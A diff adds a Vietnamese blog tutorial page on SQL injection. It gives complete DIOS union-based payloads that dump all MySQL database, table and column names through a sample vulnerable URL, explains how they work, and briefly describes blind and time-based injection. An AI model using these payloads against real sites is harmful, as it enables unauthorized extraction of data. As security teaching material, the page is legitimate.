@@ -1,0 +1,127 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>SQLI (Part 4)</title>
+        <link rel="icon" type="image/png" href="https://asayami.github.io/favicon.png"/>
+        <link rel="stylesheet" href="sqli_source/sqli_css.css">
+        <script src="sqli_source/sqli_js.js"></script>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+        <meta name="description" content="Những bài viết, kinh nghiệm của mình về SQL Injection">
+		<meta name="keywords" content="Hacking, hack, SQLI, SQL Injection">
+		<meta name="author" content="Asayami Kurashin">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    <body>
+        <!-- Navigation Bar -->
+        <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
+            <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
+                <script>window.onscroll = NavScroll;</script>
+                <a class="navbar-branch" href="https://asayami.github.io/">
+                    <img src="https://asayami.github.io/transparent-favicon.png" style="width:50px;"></img>
+                </a>
+                <button class="navbar-toggler ml-auto custom-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"  aria-controls="navbarSupportedContent-7" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item active navitem">
+                            <a href="https://asayami.github.io/">Home
+                                <span class="sr-only">(current)</span>
+                            </a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io/hacking.html">Hacking</a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io#aboutanchor">About</a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io#contactanchor">Contact</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="mainPicture"></div>
+		<div class="paratitle">
+			<h2>DIOS SQL Injection</h2>
+		</div>
+		<div class="paragraph">
+			<p>DIOS có nghĩa Dump In One Shot là các query giúp dễ dàng và nhanh chóng dump các data trong bảng
+			trong một nốt nhạc. Trong phần này mình sẽ vừa đưa ra các query đáng chú ý và giải thích sơ lược.
+			Bạn đọc nên tự mình thử các query vào database thật để hiểu một cách rõ ràng nhất</p>
+			<p>Khởi đầu cho phương pháp này chúng ta vẫn cần phải tìm số column được gọi trong query. Sau đó
+			URL giả sử có dạng:
+			<font color="#009933">
+				worldend.com/store.php?id=1' and false union &#60;Your Query Here>
+			</font color="#009933"></p>
+			<p><i class="fa-solid fa-triangle-exclamation"></i>
+			Lưu ý toàn bộ các query bên dưới phải thêm chính xác số lượng cột như các bài học trước (select 1,2,3,...)</p>
+			<p>Sau đây là SQL query để lấy danh sách toàn bộ database:</p>
+			<p><font color="#009933">
+			(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata) where (@a)in (@a:=concat('&#60;br>',schema_name,@a))))a)
+			</font color="#009933"></p>
+			<p>@a có kí tự @ phía trước có nghĩa đó là một biến ta khai báo. Sau đó bên trong FROM @a được gán giá trị
+			HEX 0x00 hay NULL, sau đó câu lệnh
+			<font color="#009933">
+			select (@a) from (information_schema.schemata)
+			</font color="#009933">
+			sẽ tạo một bảng ảo với một cột, các hàng đều mang cùng giá trị hiện tại của @a. Thực chất TABLE schemata
+			đã được thêm một cột ảo, sau đó các hàng của cột ảo này được SELECT. Và mỗi lần đi qua một hàng @a
+			sẽ được thêm data cần thiết bằng function CONCAT</p>
+			<img src="sqli_source/DIOS_db.png" style="width:8%" class="img-fluid mx-auto d-block responsive_phone"></img>
+			<p><br>Trong ảnh trên có tới 3 hàng vì ban đầu trong bảng schemata cũng có 3 hàng ứng với 3 database
+			mysql, information_schema và sukabase</p>
+			<p><i class="fa-solid fa-triangle-exclamation"></i>
+			Nên nhớ giới hạn kí tự là 1024 nên nếu muốn bypass bạn đọc xem lại phần trước</p>
+			<p><font color="#009933">
+			(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables) where table_schema!='information_schema' and(@a)in (@a:=concat('&#60;br>',table_name,@a))))a)
+			</font color="#009933"></p>
+			<p>Query trên giúp lấy tên toàn bộ bảng trong tất cả database (ngoại trừ information_schema vì database
+			này chứa quá nhiều bảng không cần thiết). Tuy nhiên nhìn như vậy chúng ta không thể biết bảng nào thuộc
+			database nào, nên phải có cách hiệu quả hơn, đó là query bên dưới:</p>
+			<p><font color="#009933">
+			(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where table_schema!='information_schema' and(@a)in (@a:=concat('&#60;br>',table_schema,0x3a,table_name,@a))))a)
+			</font color="#009933"></p>
+			<p>Kế đến chúng ta sẽ thêm cả danh sách các cột phía sau mỗi hàng chứa tên database và table như bên dưới:</p>
+			<p><font color="#009933">
+			(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and(@a)in (@a:=concat('&#60;br>',table_schema,' > ',table_name,' > ',column_name,@a))))a)
+			</font color="#009933"></p>
+			<p>Cuối cùng, ta có thể thêm option như chỉ in ra các bảng bắt đầu bằng suka chẳng hạn như bên dưới:</p>
+			<p><font color="#009933">
+(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and table_name like 'suka%' and(@a)in (@a:=concat('&#60;br>',table_schema,' > ',table_name,' > ',column_name,@a))))a)
+			</font color="#009933"></p>
+		</div>
+		
+		
+		<div class="paratitle">
+			<h2>Blind SQL Injection</h2>
+		</div>
+		<div class="paragraph">
+			<p>Nếu một website không chứa output cho truy vấn có nghĩa không thê sử dụng các phương pháp SQL Injection
+			thông thường như Union, XPATH,... Khi đó có thể sẽ sử dụng được Blind SQL Injection. Bản chất của phương
+			pháp này là chúng ta hỏi database system xem một truy vấn nào đó có đúng hay không. Điều kiện thực hiện
+			được kiểu injection này là vẫn có thể exploit (sử dụng ',",...), giao diện website trả về đối với truy vấn
+			true và false phải phân biệt được. Và vì sử dụng cách này rất tốn thời gian nên chúng ta chỉ nên lấy những data
+			quan trọng cần tìm.</p>
+			<p>Vì cách này ít khi hữu dụng nên mình sẽ không nói chi tiết các bước, nếu muốn tham khảo sâu hơn, bạn
+			đọc xem tại
+			<a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html">Here</a></p>
+			<p><h5><i class="fa-solid fa-asterisk"></i> Time Based Blind Injection</h5></p>
+			<p>Trong trường hợp không thể phân biệt được giao diện trả về query true và false những các điều kiện
+			còn lại vẫn thoả mãn, chúng ta có thể sử dụng Time Based Blind Injection. Phương pháp này đơn thuần là
+			xác định true hay false dựa trên thời gian load trang. Bạn đọc xem chi tiết tại
+			<a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/time-based-blind-injection.html">Here</a>
+			</p>
+		</div>
+    </body>
+    
+</html>
